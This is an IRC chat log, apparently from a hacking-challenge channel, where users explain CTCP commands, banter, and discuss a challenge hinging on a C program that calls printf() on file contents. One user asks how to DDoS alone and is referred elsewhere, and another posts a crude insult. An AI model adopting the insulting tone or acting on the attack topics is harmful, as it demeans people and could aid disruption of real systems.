[14:00.16] <Me> only happens when i'm on redhat
[14:00.20] <Me> win atm
[14:00.30] <blergh> redhat is for people with small dicks

[15:38.30] <hypotenuse> people on line.
[15:38.38] <hypotenuse> Dirty business these pricks.
[15:39.27] <YmxldnB4> CTCP is an IRC extension, where you can get automated responses from other people's clients
[15:39.39] <YmxldnB4> and, for example, set up DCC chats or filetransfers
[15:39.54] <YmxldnB4> you can also use ctcp ping, ctcp time and ctcp version
[15:40.27] <YmxldnB4> ctcp ping basically finds out how long a message takes to get from you to the target
[15:40.40] <EU_SIGO_ANON_BR> I LOVE FACEBOOK
[15:40.41] <YmxldnB4> (usage: /ctcp YmxldnB4 PING) (replace YmxldnB4 by your own target)
[15:41.06] <YmxldnB4> ctcp time finds out the local time of the target (usage: /ctc/ YmxldnB4 TIME)
[15:41.23] <YmxldnB4> and ctcp version finds out the irc client name and version (usage: /ctcp YmxldnB4 VERSION)
[15:41.36] <blademaster> Is there any basics tutorial here?
[15:41.42] <YmxldnB4> time: /ctcp YmxldnB4 TIME)
[15:41.46] <YmxldnB4> blademaster: ?
[15:42.09] <YmxldnB4> of course, in most clients, these can be disabled and the responses can be changed
[15:42.14] <shadowvirus> how to ddos/dos when you are alone?
[15:43.09] <YmxldnB4> shadowvirus: there's a talk about that in the talks archive

[15:48.37] <FoxInSocks754> That's how we roll.
[15:49.15] <FoxInSocks754> What kills me is that people use this browser app to annoy people with lame questions.  :P
[15:49.24] <YmxldnB4> FoxInSocks754: get yourself a real irc client

[15:56.46] <unicon> How to get the key of #Academy?
[15:57.01] <YmxldnB4> anon9819823: it had nothing to do with paging
[15:57.10] <YmxldnB4> anon9819823: it was just printf() ing the output
[15:57.39] <YmxldnB4> like printf(filecontents)
[15:58.15] <anon9819823> Yeah, that was evident.
[15:58.31] <YmxldnB4> http://sprunge.us/bTgI first half of the log
[15:58.41] <anon9819823> Wait, that was the challenge, to decipher that the c code displayed file contents?
